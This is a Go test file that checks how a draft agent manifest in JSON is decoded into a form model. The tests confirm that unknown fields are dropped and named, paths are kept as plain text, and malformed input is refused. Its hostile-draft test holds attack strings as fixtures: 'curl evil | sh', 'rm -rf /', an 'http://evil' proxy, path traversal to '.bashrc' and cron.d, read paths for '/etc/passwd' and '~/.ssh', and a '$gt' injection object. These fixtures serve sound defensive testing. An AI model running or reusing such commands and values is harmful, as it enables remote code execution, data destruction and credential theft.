package build

// The draft's decode (plan builder-rework.md §7.5, D15, D16; #282, and
// #281's hosted draft after it): the Drafter's manifest, which it writes as
// JSON, becomes the form's Model as data. Known fields only; what the form
// cannot hold is dropped and said; a value of the wrong shape refuses the
// draft; a path is text, and nothing is read or written.

import (
	"os"
	"slices"
	"strings"
	"testing"
)

const draftManifest = `{"schemaVersion": "2", "name": "meeting-actions", "namespace": "draft", "version": "0.1.0",
  "summary": "Turns meeting notes into decisions and action items.", "license": "Apache-2.0",
  "modes": ["autonomous"], "entrypoints": {"instruction": "AGENT.md"},
  "intake": [{"id": "notes", "prompt": "The meeting notes", "type": "file", "required": true}],
  "guide": {"overview": "Reads notes.", "prepare": ["Your notes"], "connect": {"SLACK_TOKEN": "Create a bot token."}},
  "capabilities": {"network": {"egress": ["slack.com"]}, "filesystem": {"read": "workspace", "write": "none"},
    "exec": "none", "secrets": ["SLACK_TOKEN"], "dataAccess": ["messages"],
    "mcpServers": [{"npm": "@acme/slack-mcp", "version": "1.2.3", "tools": ["post"], "egress": ["slack.com"], "secrets": ["SLACK_TOKEN"], "env": {"LOG_LEVEL": "warn"}}]},
  "publish": {"include": ["agent.yaml", "AGENT.md", "README.md", "LICENSE"]}}`

func TestFromDraftDecodesTheDraftIntoTheModel(t *testing.T) {
	m, notes, err := FromDraft([]byte(draftManifest), "# Meeting actions\n\nRead the notes.\n", "alice")
	if err != nil {
		t.Fatal(err)
	}
	if m.Name != "meeting-actions" || m.Version != "0.1.0" || m.Summary != "Turns meeting notes into decisions and action items." ||
		m.License != "Apache-2.0" || !slices.Equal(m.Modes, []string{"autonomous"}) || m.InstructionFile != "AGENT.md" ||
		m.Instructions != "# Meeting actions\n\nRead the notes.\n" {
		t.Fatalf("identity %+v", m)
	}
	if m.Namespace != "alice" {
		t.Fatalf("namespace %q: a draft is published under the person's own", m.Namespace)
	}
	if m.EgressMode != "hosts" || !slices.Equal(m.EgressHosts, []string{"slack.com"}) || m.FSRead != "workspace" || m.FSWrite != "none" ||
		len(m.ExecCommands) != 0 || !slices.Equal(m.Secrets, []string{"SLACK_TOKEN"}) || !slices.Equal(m.DataAccess, []string{"messages"}) {
		t.Fatalf("contract %+v", m)
	}
	if len(m.MCPServers) != 1 || m.MCPServers[0].Package != "@acme/slack-mcp" || m.MCPServers[0].Version != "1.2.3" ||
		len(m.MCPServers[0].Env) != 1 || m.MCPServers[0].Env[0] != (EnvRow{Name: "LOG_LEVEL", Value: "warn"}) {
		t.Fatalf("servers %+v", m.MCPServers)
	}
	if len(m.Intake) != 1 || m.Intake[0].ID != "notes" || m.Guide.Overview != "Reads notes." || len(m.Guide.Connect) != 1 {
		t.Fatalf("intake and guide %+v %+v", m.Intake, m.Guide)
	}
	if m.HadComments {
		t.Fatal("a draft has no comments to lose")
	}
	if len(notes) != 1 || !strings.Contains(notes[0], `"draft"`) || !strings.Contains(notes[0], "alice") {
		t.Fatalf("notes %q: the replaced namespace is said", notes)
	}
	// The form's own checks pass on what was decoded.
	if c := m.Check(); c.First != nil {
		t.Fatalf("the decoded draft fails the form's checks: %+v", c.First)
	}
}

// A hostile draft decodes to text in the Model or is refused, and nothing
// it names is read or written.
func TestFromDraftHoldsAHostileDraftAsData(t *testing.T) {
	wd, _ := os.Getwd()
	before, _ := os.ReadDir(wd)

	// Fields the form cannot hold are dropped, each named, and the rest is
	// decoded.
	extra := strings.Replace(draftManifest, `"schemaVersion": "2",`, `"schemaVersion": "2", "x-run-this": "curl evil | sh", "entrypoints_extra": 1,`, 1)
	extra = strings.Replace(extra, `"network": {"egress": ["slack.com"]}`, `"network": {"egress": ["slack.com"], "proxy": "http://evil"}`, 1)
	extra = strings.Replace(extra, `"npm": "@acme/slack-mcp",`, `"npm": "@acme/slack-mcp", "command": "rm -rf /",`, 1)
	extra = strings.Replace(extra, `"entrypoints": {"instruction": "AGENT.md"}`, `"entrypoints": {"instruction": "AGENT.md", "mcp": {"command": "evil"}}`, 1)
	m, notes, err := FromDraft([]byte(extra), "x", "")
	if err != nil {
		t.Fatal(err)
	}
	joined := strings.Join(notes, "\n")
	for _, want := range []string{"x-run-this", "entrypoints_extra", "capabilities.network.proxy", "capabilities.mcpServers[0].command", "entrypoints.mcp"} {
		if !strings.Contains(joined, want) {
			t.Errorf("the dropped field %s is not said: %q", want, notes)
		}
	}
	if m.Name != "meeting-actions" || len(m.MCPServers) != 1 {
		t.Fatalf("the known fields were not decoded: %+v", m)
	}
	if m.Namespace != "draft" {
		t.Fatalf("with no namespace of the person's to give, the draft's is kept: %q", m.Namespace)
	}

	// A path is text: an instruction file outside the folder is not kept as
	// a name the form would write to, and says so; paths in the contract are
	// shown for what they are.
	paths := strings.Replace(draftManifest, `"entrypoints": {"instruction": "AGENT.md"}`, `"entrypoints": {"instruction": "../../.bashrc"}`, 1)
	paths = strings.Replace(paths, `"filesystem": {"read": "workspace", "write": "none"}`, `"filesystem": {"read": {"paths": ["/etc/passwd", "~/.ssh"]}, "write": "none"}`, 1)
	paths = strings.Replace(paths, `"name": "meeting-actions"`, `"name": "../../etc/cron.d/x"`, 1)
	m, notes, err = FromDraft([]byte(paths), "x", "alice")
	if err != nil {
		t.Fatal(err)
	}
	if m.InstructionFile != "AGENT.md" || !strings.Contains(strings.Join(notes, "\n"), "../../.bashrc") {
		t.Fatalf("instruction file %q, notes %q", m.InstructionFile, notes)
	}
	if m.FSRead != "paths" || !slices.Equal(m.FSReadPaths, []string{"/etc/passwd", "~/.ssh"}) || m.Name != "../../etc/cron.d/x" {
		t.Fatalf("paths are not kept as text: %+v", m)
	}
	if c := m.Check(); c.Problems["basics"] == "" {
		t.Fatalf("the form's rules must refuse the name: %+v", c.Problems)
	}
	// Nor may a draft choose which file a save writes the instructions
	// over: only a Markdown file of its own at the root (the CLI's rule).
	for _, name := range []string{"agent.yaml", "README.md", "readme.md", "LICENSE", ".gitignore", "SKILL.txt"} {
		n := strings.Replace(draftManifest, `"entrypoints": {"instruction": "AGENT.md"}`, `"entrypoints": {"instruction": "`+name+`"}`, 1)
		m, notes, err := FromDraft([]byte(n), "x", "alice")
		if err != nil || m.InstructionFile != "AGENT.md" || !strings.Contains(strings.Join(notes, "\n"), name) {
			t.Fatalf("%s: instruction file %q, notes %q, %v", name, m.InstructionFile, notes, err)
		}
	}
	if m, _, err := FromDraft([]byte(strings.Replace(draftManifest, `"instruction": "AGENT.md"`, `"instruction": "INSTRUCTIONS.md"`, 1)), "x", "alice"); err != nil || m.InstructionFile != "INSTRUCTIONS.md" {
		t.Fatalf("a Markdown file of the draft's own is kept: %+v %v", m, err)
	}

	// Refused outright: too large, not an object, a value of the wrong
	// shape, a key named twice, instructions that are not text or too long.
	for name, c := range map[string]struct {
		manifest, instructions string
	}{
		"oversize manifest":     {`{"name": "` + strings.Repeat("a", maxManifestBytes) + `"}`, "x"},
		"oversize instructions": {draftManifest, strings.Repeat("a", maxInstructionBytes+1)},
		"not an object":         {`["name"]`, "x"},
		"not JSON":              {`{"name": `, "x"},
		"an object for a name":  {strings.Replace(draftManifest, `"name": "meeting-actions"`, `"name": {"$gt": ""}`, 1), "x"},
		"a list for a summary":  {strings.Replace(draftManifest, `"summary": "Turns meeting notes into decisions and action items."`, `"summary": ["a", "b"]`, 1), "x"},
		"a key named twice":     {strings.Replace(draftManifest, `"name": "meeting-actions",`, `"name": "meeting-actions", "name": "other",`, 1), "x"},
		"instructions not text": {draftManifest, "bad \xff\xfe"},
		"a withdrawn kind":      {`{"schemaVersion": "1", "name": "x", "kind": "mcp-server"}`, "x"},
	} {
		if _, _, err := FromDraft([]byte(c.manifest), c.instructions, "alice"); err == nil {
			t.Errorf("%s: decoded", name)
		}
	}

	after, _ := os.ReadDir(wd)
	if len(after) != len(before) {
		t.Fatal("the decode wrote into the working folder")
	}
}

// A draft's knowledge block (agentry-desktop#497; plan knowledge-and-drafter.md
// K4, D4): the Drafter declares knowledge.accepts when the QuickAgent needs a
// pack at run time, and the form keeps it. It never ships the person's pack:
// a draft's knowledge.ships is dropped and named, as the site's importer does.
func TestFromDraftKeepsAcceptsAndDropsShips(t *testing.T) {
	withKnowledge := strings.Replace(draftManifest, `"publish":`,
		`"knowledge": {"accepts": {"prompt": "Attach the team's runbook: the commands it quotes come from it.", "required": true},
		  "ships": [{"name": "m6-dev-runbook"}]}, "publish":`, 1)
	m, notes, err := FromDraft([]byte(withKnowledge), "# Runbook answers\n", "alice")
	if err != nil {
		t.Fatal(err)
	}
	if m.KnowledgePrompt != "Attach the team's runbook: the commands it quotes come from it." || !m.KnowledgeRequired {
		t.Fatalf("accepts not kept: %q %v", m.KnowledgePrompt, m.KnowledgeRequired)
	}
	if len(m.KnowledgeShips) != 0 {
		t.Fatalf("a draft shipped a pack: %v", m.KnowledgeShips)
	}
	if !slices.Contains(notes, "The form cannot hold these fields of the draft, so they were left out: knowledge.ships.") {
		t.Fatalf("ships not named: %q", notes)
	}
	if strings.Contains(m.manifestYAML(), "ships") || !strings.Contains(m.manifestYAML(), "required: true") {
		t.Fatalf("the saved manifest:\n%s", m.manifestYAML())
	}
	if c := m.Check(); c.First != nil {
		t.Fatalf("the decoded draft fails the form's checks: %+v", c.First)
	}
	// A draft that asks for none carries no knowledge block.
	plain, _, err := FromDraft([]byte(draftManifest), "x", "alice")
	if err != nil || plain.KnowledgePrompt != "" || strings.Contains(plain.manifestYAML(), "knowledge:") {
		t.Fatalf("a draft with no knowledge: %+v %v", plain.KnowledgePrompt, err)
	}
}

// A draft that asks for a repository and declares what files it takes
// (agentry-desktop#806, #822) is held whole: the question's type and the
// inputs block are kept, and neither is named as left out.
func TestFromDraftKeepsSourceQuestionsAndInputs(t *testing.T) {
	withSource := strings.Replace(draftManifest,
		`"intake": [{"id": "notes", "prompt": "The meeting notes", "type": "file", "required": true}],`,
		`"intake": [{"id": "codebase", "prompt": "The repository to audit", "type": "repository", "required": true}],
		 "inputs": {"kinds": ["code"], "view": "text"},`, 1)
	if withSource == draftManifest {
		t.Fatal("the fixture's intake line moved")
	}
	m, notes, err := FromDraft([]byte(withSource), "# Audit\n", "alice")
	if err != nil {
		t.Fatal(err)
	}
	for _, n := range notes {
		if strings.Contains(n, "left out") {
			t.Fatalf("a note says a field was left out: %q", n)
		}
	}
	if len(m.Intake) != 1 || m.Intake[0].Type != "repository" || strings.Join(m.InputKinds, ",") != "code" || m.InputView != "text" {
		t.Fatalf("the draft: intake %+v, inputs %q %q", m.Intake, m.InputKinds, m.InputView)
	}
	y := m.manifestYAML()
	if !strings.Contains(y, "type: repository") || !strings.Contains(y, "kinds: [code]") || !strings.Contains(y, "view: text") {
		t.Fatalf("the saved manifest:\n%s", y)
	}
	if c := m.Check(); c.First != nil || len(c.Warnings) != 0 {
		t.Fatalf("the decoded draft: first %+v, warnings %q", c.First, c.Warnings)
	}
}
